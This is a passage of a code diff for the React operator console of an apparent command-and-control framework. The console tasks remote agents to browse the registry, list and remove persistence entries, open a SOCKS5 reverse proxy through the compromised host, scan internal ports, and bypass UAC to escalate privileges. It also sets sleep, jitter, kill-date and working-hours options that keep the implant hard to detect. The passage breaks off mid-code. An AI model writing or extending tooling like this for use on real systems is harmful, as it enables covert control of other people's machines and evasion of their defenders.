-            const parsed = JSON.parse(result.output);
-            if (Array.isArray(parsed)) {
-              setSubkeys(parsed);
-            }
-          } catch {}
-          setLoading(false);
-        }
-      } catch {}
-    }, 2000);
-    return () => clearInterval(interval);
-  }, [pendingSubkeysTask, agentId]);
-
-  // Poll for values result
-  useEffect(() => {
-    if (!pendingValuesTask) return;
-    const interval = setInterval(async () => {
-      try {
-        const results = await api.getAgentResults(agentId);
-        const result = results.find(r => r.task_id === pendingValuesTask);
-        if (result) {
-          clearInterval(interval);
-          setPendingValuesTask(null);
-          try {
-            const parsed = JSON.parse(result.output);
-            if (parsed && !Array.isArray(parsed)) {
-              setValues(prev => [...prev, parsed]);
-            }
-          } catch {}
-        }
-      } catch {}
-    }, 2000);
-    return () => clearInterval(interval);
-  }, [pendingValuesTask, agentId]);
-
-  const browseKey = async (fullPath) => {
-    const { hive: h, path: p } = parsePath(fullPath || pathInput);
+  const browseKey = (fullPath) => {
+    const fp = fullPath || pathInput;
+    const { hive: h, path: p } = parsePath(fp);
     setHive(h);
     setRegPath(p);
-    setPathInput(fullPath || pathInput);
+    setPathInput(fp);
     setLoading(true);
     setError(null);
     setSubkeys([]);
     setValues([]);
 
-    try {
-      // List subkeys
-      const res = await api.createTask(agentId, 'config_store_list', { hive: h, path: p });
-      setPendingSubkeysTask(res.id);
-    } catch (e) {
+    // List subkeys
+    sendAndPoll(agentId, 'config_store_list', { hive: h, path: p }, (result) => {
       setLoading(false);
-      setError(e.message);
-    }
+      if (result && Array.isArray(result)) {
+        setSubkeys(result);
+      } else if (result && typeof result === 'string') {
+        setError(result);
+      } else if (result === null) {
+        setError('Timeout: no response from agent');
+      }
+    });
+
+    // Also read values (name: "*" reads all, but agent reads one at a time)
+    // For now we just list subkeys; values come from clicking
+    sendAndPoll(agentId, 'config_store_read', { hive: h, path: p, name: '(Default)' }, (result) => {
+      if (result && typeof result === 'object' && !Array.isArray(result)) {
+        setValues([result]);
+      }
+    });
   };
 
   const navigateSubkey = (subkeyName) => {
-    const newFullPath = hive + '\\' + (regPath ? regPath + '\\' : '') + subkeyName;
-    setPathInput(newFullPath);
-    browseKey(newFullPath);
-  };
-
-  const handleKeyDown = (e) => {
-    if (e.key === 'Enter') {
-      e.preventDefault();
-      browseKey();
-    }
+    const newPath = hive + '\\' + (regPath ? regPath + '\\' : '') + subkeyName;
+    setPathInput(newPath);
+    browseKey(newPath);
   };
 
   const regTypeToString = (t) => {
@@ -846,113 +855,213 @@ function ConfigStoreTab({ agentId }) {
     return types[t] || 'REG_' + t;
   };
 
+  const regCtxItems = [
+    { label: 'New Key', icon: '📁', onClick: () => showToast('Not implemented') },
+    { label: 'New Value', icon: '➕', onClick: () => showToast('Not implemented') },
+    { separator: true },
+    { label: 'Delete Key', icon: '🗑', danger: true, onClick: () => showToast('Not implemented') },
+  ];
+
   return (
-    <div style={{ padding: 16 }}>
-      <div className="section-label">Registry Browser</div>
-      <div style={{ display: 'flex', gap: 8, marginBottom: 16 }}>
-        <input
-          type="text"
-          className="form-input"
-          value={pathInput}
-          onChange={e => setPathInput(e.target.value)}
-          onKeyDown={handleKeyDown}
-          placeholder="HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-          spellCheck="false"
-          style={{ flex: 1, fontFamily: 'var(--font-mono)', fontSize: 11 }}
-        />
-        <button className="btn btn-sm btn-green" onClick={() => browseKey()} disabled={loading}>
+    <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
+      <div style={S.toolbar}>
+        <span style={{ color: 'rgba(255,255,255,0.5)', fontSize: 11 }}>PATH:</span>
+        <input type="text" value={pathInput} onChange={e => setPathInput(e.target.value)}
+          onKeyDown={e => e.key === 'Enter' && browseKey()}
+          style={{ ...S.toolInput, flex: 1 }} spellCheck="false" />
+        <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={() => browseKey()} disabled={loading}>
           {loading ? '⏳' : 'BROWSE'}
         </button>
       </div>
-      {error && <div style={{ color: 'var(--red)', fontFamily: 'var(--font-mono)', fontSize: 11, marginBottom: 8 }}>Error: {error}</div>}
-      <div style={{ display: 'grid', gridTemplateColumns: '280px 1fr', gap: 16 }}>
-        <div style={{ border: '1px solid var(--border)', background: 'var(--term-bg)', padding: 12, fontFamily: 'var(--font-mono)', fontSize: 11, minHeight: 300, overflowY: 'auto' }}>
-          <div style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-muted)', marginBottom: 8, textTransform: 'uppercase', letterSpacing: '1.4px' }}>
-            Subkeys
+      <div style={S.splitPanel}>
+        <div style={S.splitLeft}>
+          <div style={{ padding: 4 }}>
+            {hives.map(h => (
+              <div key={h.short}>
+                <div onClick={() => browseKey(h.short)} style={{
+                  padding: '4px 8px', cursor: 'pointer', fontSize: 12, fontFamily: 'var(--font-mono)',
+                  color: hive === h.short ? 'var(--green)' : 'rgba(255,255,255,0.7)',
+                  background: hive === h.short ? 'rgba(0,255,136,0.08)' : 'transparent',
+                }} onMouseEnter={e => { if (hive !== h.short) e.currentTarget.style.background = 'rgba(255,255,255,0.05)'; }}
+                   onMouseLeave={e => { if (hive !== h.short) e.currentTarget.style.background = 'transparent'; }}
+                   onContextMenu={e => { e.preventDefault(); setCtx({ x: e.clientX, y: e.clientY, items: regCtxItems }); }}>
+                  <span style={{ fontSize: 13, marginRight: 6 }}>{h.icon}</span> {h.short}
+                </div>
+                {hive === h.short && subkeys.map((sk, i) => (
+                  <div key={i} onClick={() => navigateSubkey(sk)} style={{
+                    padding: '4px 8px', paddingLeft: 24, cursor: 'pointer', color: 'var(--green)', fontSize: 12, fontFamily: 'var(--font-mono)',
+                  }} onMouseEnter={e => e.currentTarget.style.background = 'rgba(255,255,255,0.05)'}
+                     onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
+                    📁 {sk}
+                  </div>
+                ))}
+              </div>
+            ))}
           </div>
-          {loading && <div style={{ color: 'var(--yellow)' }}>⏳ Loading...</div>}
-          {subkeys.length === 0 && !loading && <div style={{ color: 'var(--text-disabled)' }}>No subkeys found</div>}
-          {subkeys.map((sk, i) => (
-            <div key={i} className="reg-node" style={{ padding: '4px 8px', cursor: 'pointer', color: 'var(--green)' }}
-                 onClick={() => navigateSubkey(sk)}>
-              <span className="reg-icon">📁</span> {sk}
-            </div>
-          ))}
         </div>
-        <div>
-          <div style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-muted)', marginBottom: 8, textTransform: 'uppercase', letterSpacing: '1.4px' }}>
+        <div style={S.splitRight}>
+          {error && <div style={{ color: 'var(--red)', fontFamily: 'var(--font-mono)', fontSize: 11, padding: 12 }}>Error: {error}</div>}
+          <div style={{ padding: '8px 12px', fontSize: 10, color: 'rgba(255,255,255,0.5)', fontFamily: 'var(--font-mono)', textTransform: 'uppercase', borderBottom: '1px solid var(--border)' }}>
             {hive}\\{regPath}
           </div>
-          <table>
-            <thead><tr><th>Name</th><th>Type</th><th>Data</th></tr></thead>
-            <tbody>
-              {values.length === 0 ? (
-                <tr><td colSpan={3} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>Click BROWSE to load registry values</td></tr>
-              ) : values.map((v, i) => (
-                <tr key={i}>
-                  <td>{v.name}</td>
-                  <td style={{ color: 'var(--text-muted)' }}>{regTypeToString(v.type)}</td>
-                  <td style={{ fontFamily: 'var(--font-mono)', fontSize: 11, wordBreak: 'break-all' }}>{v.value}</td>
-                </tr>
-              ))}
-            </tbody>
-          </table>
+          <div style={{ flex: 1, overflowY: 'auto' }}>
+            <table style={{ width: '100%', borderCollapse: 'collapse' }}>
+              <thead><tr>
+                <th style={S.th}>Name</th><th style={S.th}>Type</th><th style={S.th}>Data</th>
+              </tr></thead>
+              <tbody>
+                {loading && <tr><td colSpan={3} style={{ ...S.td, textAlign: 'center', color: 'var(--yellow)' }}>⏳ Loading...</td></tr>}
+                {!loading && values.length === 0 && subkeys.length === 0 && (
+                  <tr><td colSpan={3} style={{ ...S.td, textAlign: 'center', color: 'rgba(255,255,255,0.3)' }}>Click BROWSE to load</td></tr>
+                )}
+                {!loading && values.length === 0 && subkeys.length > 0 && subkeys.map((sk, i) => (
+                  <tr key={i}><td style={{ ...S.td, color: '#61afef', cursor: 'pointer' }} onClick={() => navigateSubkey(sk)}>📁 {sk}</td>
+                    <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>REG_KEY</td>
+                    <td style={{ ...S.td, color: 'rgba(255,255,255,0.3)' }}>—</td></tr>
+                ))}
+                {values.map((v, i) => (
+                  <tr key={i} onContextMenu={e => { e.preventDefault(); setCtx({ x: e.clientX, y: e.clientY, items: [
+                    { label: 'Copy Data', icon: '📋', onClick: () => { navigator.clipboard.writeText(v.value || ''); showToast('📋 Copied'); } },
+                    { separator: true },
+                    { label: 'Delete Value', icon: '🗑', danger: true },
+                  ]}); }}>
+                    <td style={S.td}>{v.name}</td>
+                    <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{regTypeToString(v.type)}</td>
+                    <td style={{ ...S.td, color: v.type === 4 ? 'var(--yellow)' : 'var(--green)', maxWidth: 400, overflow: 'hidden', textOverflow: 'ellipsis', wordBreak: 'break-all' }}>{v.value}</td>
+                  </tr>
+                ))}
+              </tbody>
+            </table>
+          </div>
         </div>
       </div>
+      {ctx && <ContextMenu x={ctx.x} y={ctx.y} items={ctx.items} onClose={() => setCtx(null)} />}
     </div>
   );
 }
 
-/* ========== SERVICES TAB ========== */
-function ServicesTab({ agentId }) {
-  const [services, setServices] = useState([]);
+/* ========== PERSISTENCE TAB ========== */
+function PersistenceTab({ agentId, showToast }) {
+  const [entries, setEntries] = useState([]);
+  const [loading, setLoading] = useState(false);
 
-  const addPersistence = () => {
-    api.createTask(agentId, 'service_manager_install', {});
-  };
   const refresh = () => {
-    api.createTask(agentId, 'boot_entries_list', {});
+    setLoading(true);
+    sendAndPoll(agentId, 'boot_entries_list', {}, (result) => {
+      setLoading(false);
+      if (result && Array.isArray(result)) {
+        setEntries(result);
+      } else {
+        setEntries([]);
+      }
+    });
+  };
+
+  useEffect(() => { refresh(); }, [agentId]);
+
+  const registry = entries.filter(e => e.type === 'registry');
+  const tasks = entries.filter(e => e.type === 'scheduled_task');
+  const startup = entries.filter(e => e.type === 'startup_folder');
+  const other = entries.filter(e => !['registry', 'scheduled_task', 'startup_folder'].includes(e.type));
+
+  const removePersistence = (entry) => {
+    const method = entry.type === 'scheduled_task' ? 'schtask' : entry.type === 'startup_folder' ? 'startup_folder' : 'registry';
+    sendAndPoll(agentId, 'boot_entries_remove', { method, name: entry.name, hive: entry.location?.startsWith('HKLM') ? 'HKLM' : 'HKCU' }, (result) => {
+      showToast('🗑 Removed');
+      setTimeout(refresh, 2000);
+    });
   };
 
   return (
-    <div style={{ padding: 16 }}>
-      <div className="toolbar">
-        <button className="btn btn-green" onClick={addPersistence}>ADD PERSISTENCE</button>
-        <button className="btn btn-sm" onClick={refresh}>REFRESH</button>
+    <div style={{ display: 'flex', flexDirection: 'column', flex: 1 }}>
+      <div style={S.toolbar}>
+        <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={() => showToast('📌 Add persistence — use Settings tab')}>+ Add Persistence</button>
+        <div style={{ flex: 1 }} />
+        <button style={S.toolBtn} onClick={refresh} disabled={loading}>{loading ? '⏳...' : '↻ Refresh'}</button>
       </div>
-      <table>
-        <thead><tr><th>Name</th><th>Path</th><th>Type</th><th>Status</th><th>Actions</th></tr></thead>
-        <tbody>
-          {services.length === 0 ? (
-            <tr><td colSpan={5} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>No persistence entries. Click REFRESH to scan.</td></tr>
-          ) : services.map((s, i) => (
-            <tr key={i}>
-              <td>{s.name}</td>
-              <td style={{ color: 'var(--text-sec)' }}>{s.path}</td>
-              <td>{s.type}</td>
-              <td style={{ color: s.status === 'active' ? 'var(--green)' : 'var(--yellow)' }}>{s.status?.toUpperCase()}</td>
-              <td><button className="btn btn-sm btn-red">REMOVE</button></td>
-            </tr>
-          ))}
-        </tbody>
-      </table>
+      <div style={{ flex: 1, overflowY: 'auto' }}>
+        {/* Registry Run Keys */}
+        <div style={S.sectionTitle}>REGISTRY RUN KEYS <span style={S.tag('var(--green)')}>{registry.length} entries</span></div>
+        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
+          <thead><tr><th style={S.th}>Key Path</th><th style={S.th}>Value Name</th><th style={S.th}>Data</th><th style={{ ...S.th, width: 80 }}></th></tr></thead>
+          <tbody>
+            {registry.length === 0 && !loading && <tr><td colSpan={4} style={{ ...S.td, textAlign: 'center', color: 'rgba(255,255,255,0.3)' }}>No entries</td></tr>}
+            {loading && entries.length === 0 && <tr><td colSpan={4} style={{ ...S.td, textAlign: 'center', color: 'var(--yellow)' }}>⏳ Loading...</td></tr>}
+            {registry.map((e, i) => (
+              <tr key={i}>
+                <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{e.location}</td>
+                <td style={S.td}>{e.name}</td>
+                <td style={{ ...S.td, color: '#61afef' }}>{e.value}</td>
+                <td style={S.td}><button style={{ ...S.toolBtn, ...S.btnDanger, padding: '2px 8px', fontSize: 10 }}
+                  onClick={() => removePersistence(e)}>Remove</button></td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+
+        {/* Scheduled Tasks */}
+        <div style={{ ...S.sectionTitle, marginTop: 4 }}>SCHEDULED TASKS <span style={S.tag('var(--green)')}>{tasks.length} entries</span></div>
+        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
+          <thead><tr><th style={S.th}>Task Name</th><th style={{ ...S.th, width: 80 }}></th></tr></thead>
+          <tbody>
+            {tasks.length === 0 && <tr><td colSpan={2} style={{ ...S.td, textAlign: 'center', color: 'rgba(255,255,255,0.3)' }}>No tasks</td></tr>}
+            {tasks.map((e, i) => (
+              <tr key={i}>
+                <td style={S.td}>{e.name}</td>
+                <td style={S.td}><button style={{ ...S.toolBtn, ...S.btnDanger, padding: '2px 8px', fontSize: 10 }}
+                  onClick={() => removePersistence(e)}>Remove</button></td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+
+        {/* Startup Folder */}
+        <div style={{ ...S.sectionTitle, marginTop: 4 }}>STARTUP FOLDER <span style={S.tag('var(--green)')}>{startup.length} entries</span></div>
+        <table style={{ width: '100%', borderCollapse: 'collapse' }}>
+          <thead><tr><th style={S.th}>File</th><th style={S.th}>Target</th><th style={{ ...S.th, width: 80 }}></th></tr></thead>
+          <tbody>
+            {startup.length === 0 && <tr><td colSpan={3} style={{ ...S.td, textAlign: 'center', color: 'rgba(255,255,255,0.3)' }}>No entries</td></tr>}
+            {startup.map((e, i) => (
+              <tr key={i}>
+                <td style={S.td}>{e.name}</td>
+                <td style={{ ...S.td, color: '#61afef' }}>{e.path}</td>
+                <td style={S.td}><button style={{ ...S.toolBtn, ...S.btnDanger, padding: '2px 8px', fontSize: 10 }}
+                  onClick={() => removePersistence(e)}>Remove</button></td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+
+        {/* Other */}
+        {other.length > 0 && <>
+          <div style={{ ...S.sectionTitle, marginTop: 4 }}>OTHER <span style={S.tag('var(--green)')}>{other.length} entries</span></div>
+          <table style={{ width: '100%', borderCollapse: 'collapse' }}>
+            <thead><tr><th style={S.th}>Type</th><th style={S.th}>Name</th><th style={S.th}>Details</th></tr></thead>
+            <tbody>
+              {other.map((e, i) => (
+                <tr key={i}>
+                  <td style={S.td}>{e.type}</td>
+                  <td style={S.td}>{e.name || e.value || '-'}</td>
+                  <td style={{ ...S.td, color: 'rgba(255,255,255,0.5)' }}>{JSON.stringify(e)}</td>
+                </tr>
+              ))}
+            </tbody>
+          </table>
+        </>}
+      </div>
     </div>
   );
 }
 
 /* ========== NETWORK TAB ========== */
-function NetworkTab({ agentId }) {
+function NetworkTab({ agentId, showToast }) {
   const [proxyActive, setProxyActive] = useState(false);
   const [proxyPort, setProxyPort] = useState(0);
   const [connections, setConnections] = useState(0);
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState(null);
-  const [fwdLocal, setFwdLocal] = useState('');
-  const [fwdRemote, setFwdRemote] = useState('');
-  const [forwards, setForwards] = useState([]);
   const [copied, setCopied] = useState(false);
 
-  // Poll tunnel status
   const checkStatus = useCallback(async () => {
     try {
       const status = await api.tunnelStatus(agentId);
@@ -969,27 +1078,16 @@ function NetworkTab({ agentId }) {
   }, [checkStatus]);
 
   const startProxy = async () => {
-    setLoading(true);
-    setError(null);
+    setLoading(true); setError(null);
     try {
-      // First send tunnel_start task to agent to initiate WS connection
       await api.createTask(agentId, 'tunnel_start', { type: 'socks5', port: 1080 });
-      // Wait a moment for agent to connect, then start the proxy
       setTimeout(async () => {
         try {
           const res = await api.tunnelStart(agentId);
-          setProxyActive(true);
-          setProxyPort(res.port);
-          setLoading(false);
-        } catch (e) {
-          setError(e.message || 'Failed to start proxy relay');
-          setLoading(false);
-        }
+          setProxyActive(true); setProxyPort(res.port); setLoading(false);
+        } catch (e) { setError(e.message); setLoading(false); }
       }, 3000);
-    } catch (e) {
-      setError(e.message);
-      setLoading(false);
-    }
+    } catch (e) { setError(e.message); setLoading(false); }
   };
 
   const stopProxy = async () => {
@@ -997,249 +1095,164 @@ function NetworkTab({ agentId }) {
     try {
       await api.tunnelStop(agentId);
       await api.createTask(agentId, 'tunnel_stop', {});
-      setProxyActive(false);
-      setProxyPort(0);
-      setConnections(0);
-    } catch (e) {
-      setError(e.message);
-    }
+      setProxyActive(false); setProxyPort(0); setConnections(0);
+    } catch (e) { setError(e.message); }
     setLoading(false);
   };
 
   const proxyUrl = proxyPort ? `socks5://${window.location.hostname}:${proxyPort}` : '';
 
-  const copyUrl = () => {
-    navigator.clipboard.writeText(proxyUrl).then(() => {
-      setCopied(true);
-      setTimeout(() => setCopied(false), 2000);
-    });
-  };
-
-  const addForward = () => {
-    api.createTask(agentId, 'tunnel_start', { type: 'portfwd', local: fwdLocal, remote: fwdRemote });
-  };
-
   return (
-    <div style={{ padding: 16 }}>
-      <div className="two-col">
-        <div>
-          <div className="section-label">SOCKS5 REVERSE PROXY</div>
-
-          {/* Status indicator */}
-          <div style={{
-            padding: 16,
-            border: `1px solid ${proxyActive ? 'var(--green)' : 'var(--border)'}`,
-            background: proxyActive ? 'rgba(0,255,136,0.05)' : 'var(--surface)',
-            marginBottom: 16,
-          }}>
-            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12 }}>
-              <span style={{
-                width: 8, height: 8, borderRadius: '50%',
-                background: proxyActive ? 'var(--green)' : 'var(--text-disabled)',
-                display: 'inline-block',
-                animation: proxyActive ? 'pulse 2s infinite' : 'none',
-              }} />
-              <span style={{
-                fontFamily: 'var(--font-mono)', fontSize: 11, fontWeight: 700,
-                color: proxyActive ? 'var(--green)' : 'var(--text-muted)',
-                letterSpacing: '1.4px', textTransform: 'uppercase',
-              }}>
-                {proxyActive ? 'PROXY ACTIVE' : 'PROXY INACTIVE'}
-              </span>
-              {proxyActive && (
-                <span style={{
-                  fontFamily: 'var(--font-mono)', fontSize: 10,
-                  color: 'var(--text-muted)', marginLeft: 'auto',
-                }}>
-                  {connections} connection{connections !== 1 ? 's' : ''}
-                </span>
-              )}
-            </div>
-
-            {proxyActive && proxyUrl && (
-              <div style={{
-                display: 'flex', gap: 8, alignItems: 'center',
-                padding: '8px 12px', background: 'rgba(0,0,0,0.3)',
-                border: '1px solid var(--border)', marginBottom: 12,
-              }}>
-                <span style={{
-                  fontFamily: 'var(--font-mono)', fontSize: 12,
-                  color: 'var(--green)', flex: 1,
-                }}>{proxyUrl}</span>
-                <button className="btn btn-sm" onClick={copyUrl}>
-                  {copied ? '✓ COPIED' : 'COPY'}
-                </button>
-              </div>
-            )}
-
-            {error && (
-              <div style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--red)', marginBottom: 8 }}>
-                ✕ {error}
-              </div>
-            )}
-
-            <div style={{ display: 'flex', gap: 8 }}>
-              {!proxyActive ? (
-                <button className="btn btn-green" onClick={startProxy} disabled={loading}>
-                  {loading ? '⏳ STARTING...' : '▶ START PROXY'}
-                </button>
-              ) : (
-                <button className="btn btn-red" onClick={stopProxy} disabled={loading}>
-                  {loading ? '⏳ STOPPING...' : '■ STOP PROXY'}
-                </button>
-              )}
-            </div>
-          </div>
-
-          <div style={{
-            padding: 12, border: '1px solid var(--border)', background: 'var(--surface)',
-            fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-muted)',
-            lineHeight: 1.8,
-          }}>
-            <div style={{ color: 'var(--text-sec)', fontWeight: 700, marginBottom: 4 }}>HOW IT WORKS</div>
-            <div>1. Agent connects to C2 via WebSocket tunnel</div>
-            <div>2. C2 opens a local SOCKS5 port</div>
-            <div>3. Configure your browser: <span style={{ color: 'var(--green)' }}>socks5://server:PORT</span></div>
-            <div>4. All traffic routes through the agent's network</div>
-          </div>
+    <div style={{ flex: 1, overflowY: 'auto' }}>
+      {/* SOCKS5 Proxy */}
+      <div style={S.sectionTitle}>SOCKS5 PROXY</div>
+      <div style={{ border: '1px solid var(--border)', padding: 16, margin: 12 }}>
+        <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
+          {!proxyActive ? (
+            <button style={{ ...S.toolBtn, ...S.btnSuccess, padding: '8px 24px', fontSize: 13 }} onClick={startProxy} disabled={loading}>
+              {loading ? '⏳ STARTING...' : '▶ START PROXY'}
+            </button>
+          ) : (
+            <button style={{ ...S.toolBtn, ...S.btnDanger, padding: '8px 24px', fontSize: 13 }} onClick={stopProxy} disabled={loading}>
+              {loading ? '⏳ STOPPING...' : '■ STOP PROXY'}
+            </button>
+          )}
+          <span style={proxyActive ? S.tag('var(--green)') : S.tag('var(--red)')}>● {proxyActive ? 'RUNNING' : 'STOPPED'}</span>
+          <div style={{ flex: 1 }} />
+          <span style={{ color: 'rgba(255,255,255,0.3)', fontSize: 11, fontFamily: 'var(--font-mono)' }}>Connections: {connections}</span>
         </div>
-        <div>
-          <div className="section-label">Port Forwarding</div>
-          <div className="form-row" style={{ marginBottom: 12 }}>
-            <div className="form-group">
-              <label className="form-label">Local Port</label>
-              <input type="number" className="form-input" placeholder="Local port" value={fwdLocal} onChange={e => setFwdLocal(e.target.value)} />
-            </div>
-            <div className="form-group">
-              <label className="form-label">Remote Host:Port</label>
-              <input type="text" className="form-input" placeholder="host:port" value={fwdRemote} onChange={e => setFwdRemote(e.target.value)} />
-            </div>
+        {proxyActive && proxyUrl && (
+          <div style={{
+            background: '#0a0c10', padding: '8px 12px', fontSize: 12, color: 'var(--green)',
+            display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginTop: 10,
+            border: '1px solid var(--border)', fontFamily: 'var(--font-mono)',
+          }}>
+            <span>{proxyUrl}</span>
+            <button style={{ ...S.toolBtn, padding: '2px 8px', fontSize: 10 }} onClick={() => {
+              navigator.clipboard.writeText(proxyUrl);
+              setCopied(true); setTimeout(() => setCopied(false), 2000);
+              showToast('📋 Copied proxy URL');
+            }}>{copied ? '✓ Copied' : 'Copy'}</button>
           </div>
-          <button className="btn btn-green" onClick={addForward}>ADD FORWARD</button>
-          <div className="section-label" style={{ marginTop: 20 }}>Active Forwards</div>
-          <table>
-            <thead><tr><th>Local</th><th>Remote</th><th>Status</th><th>Actions</th></tr></thead>
-            <tbody>
-              {forwards.length === 0 ? (
-                <tr><td colSpan={4} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>No active forwards</td></tr>
-              ) : forwards.map((f, i) => (
-                <tr key={i}>
-                  <td>{f.local}</td><td>{f.remote}</td>
-                  <td style={{ color: 'var(--green)' }}>ACTIVE</td>
-                  <td><button className="btn btn-sm btn-red">REMOVE</button></td>
-                </tr>
-              ))}
-            </tbody>
-          </table>
-        </div>
+        )}
+        {error && <div style={{ color: 'var(--red)', fontFamily: 'var(--font-mono)', fontSize: 11, marginTop: 8 }}>✕ {error}</div>}
+      </div>
+
+      {/* Port Scanner */}
+      <div style={S.sectionTitle}>PORT SCANNER</div>
+      <div style={{ padding: 12, display: 'flex', gap: 8, alignItems: 'center' }}>
+        <input type="text" defaultValue="192.168.1.0/24" style={{ ...S.toolInput, width: 200 }} />
+        <input type="text" defaultValue="21,22,80,443,445,3389,8080" style={{ ...S.toolInput, width: 260 }} />
+        <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={() => {
+          api.createTask(agentId, 'network_scan', {}); showToast('🔍 Port scan initiated');
+        }}>Scan</button>
       </div>
     </div>
   );
 }
 
-/* ========== AGENT SETTINGS TAB ========== */
-function AgentSettingsTab({ agentId, sleep, setSleep, jitter, setJitter }) {
-  const [killDate, setKillDate] = useState('2027-01-01');
-  const [workStart, setWorkStart] = useState('08:00');
-  const [workEnd, setWorkEnd] = useState('18:00');
+/* ========== SETTINGS TAB ========== */
+function SettingsTab({ agentId, agent, showToast }) {
+  const [sleep, setSleep] = useState(agent.sleep_seconds || 30);
+  const [jitter, setJitter] = useState(agent.jitter_percent || 25);
+  const [killDate, setKillDate] = useState('2027-03-01');
+  const [workStart, setWorkStart] = useState('06:00');
+  const [workEnd, setWorkEnd] = useState('23:00');
+  const [showUpdateDialog, setShowUpdateDialog] = useState(false);
   const [updateUrl, setUpdateUrl] = useState('');
   const [updateHash, setUpdateHash] = useState('');
-  const [showUpdateDialog, setShowUpdateDialog] = useState(false);
   const [showSelfDestruct, setShowSelfDestruct] = useState(false);
 
-  const updateConfig = () => {
-    api.createTask(agentId, 'config_store_write', { sleep, jitter, kill_date: killDate, work_start: workStart, work_end: workEnd });
-  };
-
-  const selfDestructConfirm = () => {
-    api.createTask(agentId, 'cleanup', {});
-    setShowSelfDestruct(false);
-  };
-
-  const sendUpdate = () => {
-    if (!updateUrl) return;
-    api.createTask(agentId, 'self_update', { url: updateUrl, hash: updateHash });
-    setShowUpdateDialog(false);
-    setUpdateUrl('');
-    setUpdateHash('');
-  };
+  const cfgRow = { display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '10px 16px', borderBottom: '1px solid rgba(255,255,255,0.04)', fontSize: 12, fontFamily: 'var(--font-mono)' };
+  const cfgLabel = { color: 'rgba(255,255,255,0.7)' };
+  const cfgInput = { background: 'rgba(255,255,255,0.05)', border: '1px solid var(--border)', color: '#fff', fontFamily: 'var(--font-mono)', fontSize: 11, padding: '4px 8px' };
 
   return (
-    <div style={{ padding: 16, maxWidth: 600 }}>
-      <div className="form-row">
-        <div className="form-group">
-          <label className="form-label">Sleep Interval (seconds)</label>
-          <input type="number" className="form-input" value={sleep} onChange={e => setSleep(parseInt(e.target.value))} />
-        </div>
-        <div className="form-group">
-          <label className="form-label">Jitter (%)</label>
-          <div className="slider-container">
-            <input type="range" min="0" max="50" value={jitter} onChange={e => setJitter(parseInt(e.target.value))} />
-            <span className="slider-val">{jitter}%</span>
-          </div>
+    <div style={{ flex: 1, overflowY: 'auto' }}>
+      <div style={S.sectionTitle}>AGENT CONFIGURATION</div>
+      <div style={cfgRow}>
+        <label style={cfgLabel}>Sleep Interval</label>
+        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
+          <input type="range" min="1" max="300" value={sleep} onChange={e => setSleep(parseInt(e.target.value))}
+            style={{ width: 160, accentColor: 'var(--green)' }} />
+          <span style={{ color: 'var(--green)', minWidth: 40, textAlign: 'right' }}>{sleep}s</span>
         </div>
       </div>
-      <div className="form-row">
-        <div className="form-group">
-          <label className="form-label">Kill Date</label>
-          <input type="date" className="form-input" value={killDate} onChange={e => setKillDate(e.target.value)} />
-        </div>
-        <div className="form-group">
-          <label className="form-label">Working Hours</label>
-          <div style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
-            <input type="time" className="form-input" value={workStart} onChange={e => setWorkStart(e.target.value)} style={{ width: 'auto' }} />
-            <span style={{ color: 'var(--text-muted)' }}>to</span>
-            <input type="time" className="form-input" value={workEnd} onChange={e => setWorkEnd(e.target.value)} style={{ width: 'auto' }} />
-          </div>
+      <div style={cfgRow}>
+        <label style={cfgLabel}>Jitter (%)</label>
+        <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
+          <input type="range" min="0" max="100" value={jitter} onChange={e => setJitter(parseInt(e.target.value))}
+            style={{ width: 160, accentColor: 'var(--green)' }} />
+          <span style={{ color: 'var(--green)', minWidth: 40, textAlign: 'right' }}>{jitter}%</span>
         </div>
       </div>
-      <div style={{ display: 'flex', gap: 8, marginTop: 24 }}>
-        <button className="btn btn-green" onClick={updateConfig}>UPDATE CONFIG</button>
-        <button className="btn" onClick={() => api.createTask(agentId, 'reconnect', {})}>RECONNECT</button>
-        <button className="btn" style={{ marginLeft: 8 }} onClick={() => setShowUpdateDialog(!showUpdateDialog)}>UPDATE AGENT</button>
-        <button className="btn" style={{ marginLeft: 8, background: '#ff8800', color: '#000', fontWeight: 700 }} onClick={() => api.createTask(agentId, 'uac_bypass', {})}>⬆ ESCALATE</button>
+      <div style={cfgRow}>
+        <label style={cfgLabel}>Kill Date</label>
+        <input type="date" value={killDate} onChange={e => setKillDate(e.target.value)} style={cfgInput} />
+      </div>
+      <div style={cfgRow}>
+        <label style={cfgLabel}>Working Hours</label>
+        <div style={{ display: 'flex', gap: 6, alignItems: 'center' }}>
+          <input type="time" value={workStart} onChange={e => setWorkStart(e.target.value)} style={cfgInput} />
+          <span style={{ color: 'rgba(255,255,255,0.3)' }}>to</span>
+          <input type="time" value={workEnd} onChange={e => setWorkEnd(e.target.value)} style={cfgInput} />
+        </div>
+      </div>
+
+      <div style={{ ...S.sectionTitle, marginTop: 4 }}>ACTIONS</div>
+      <div style={{ padding: 12, display: 'flex', flexWrap: 'wrap', gap: 8 }}>
+        <button style={{ ...S.toolBtn, ...S.btnSuccess }} onClick={() => {
